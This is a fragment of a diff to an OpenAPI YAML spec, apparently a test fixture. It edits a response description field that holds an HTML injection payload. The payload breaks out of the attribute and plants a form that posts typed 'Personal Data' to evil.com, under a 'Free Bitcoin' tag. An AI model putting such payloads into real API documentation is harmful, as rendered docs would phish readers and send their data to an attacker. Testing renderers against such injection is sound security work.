@@ -9,7 +9,7 @@ paths:
     get:
       responses:
         '200':
-          description: No response was specified'"><form action='https://evil.com'><label>Personal Data: </label><input type='text'><input type='submit' value='Send'></form>
+          description: No response was specified'"><form action='https://evil.com'><input type='text'><input type='submit' value='Send'></form>
       tags:
         - Free Bitcoin
       operationId: findAccounts
